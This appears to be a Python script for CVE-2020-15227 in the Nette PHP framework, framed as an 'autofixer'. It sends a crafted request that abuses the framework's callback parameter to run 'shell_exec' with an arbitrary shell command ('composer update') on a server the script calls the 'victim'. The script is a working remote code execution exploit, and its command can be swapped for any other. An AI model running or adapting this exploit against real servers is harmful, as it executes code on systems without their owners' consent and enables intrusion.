#!/usr/bin/python
# author: @fr0z3nsp4z3
#
# Packages nette/application versions prior to 2.2.10, 2.3.14, 2.4.16, 3.0.6
# and nette/nette versions prior to 2.0.19 and 2.1.13 are vulnerable to an
# code injection attack by passing specially formed parameters to URL that may possibly leading to RCE.
#
# Reported by Cyku Hong from DEVCORE (https://devco.re)
#
# Impact
# Code injection, possible remote code execution.
#
# Patches
# Fixed in nette/application 2.2.10, 2.3.14, 2.4.16, 3.0.6 and nette/nette 2.0.19 and 2.1.13

import sys
from urllib import request
import argparse
import pyfiglet

print(pyfiglet.figlet_format('FIXED BY'))
print(pyfiglet.figlet_format('FR0Z3NSP4Z3'))

parser = argparse.ArgumentParser(description='CVE-2020-15227 autofixer by fr0z3nsp4z3')
parser.add_argument('url', metavar='url', nargs='+', help='Victim web URL formated as http|s://domain.com')
parser.add_argument('port', metavar='port', nargs='+', help='Victim web service port')

sys.argv = parser.parse_args()

url = sys.argv.url[0]
port = sys.argv.port[0]

r = request.urlopen(url+':'+port+'/nette.micro?callback=shell_exec&cmd=cd%20../%20&&%20composer%20update')

print('[+] Fixed')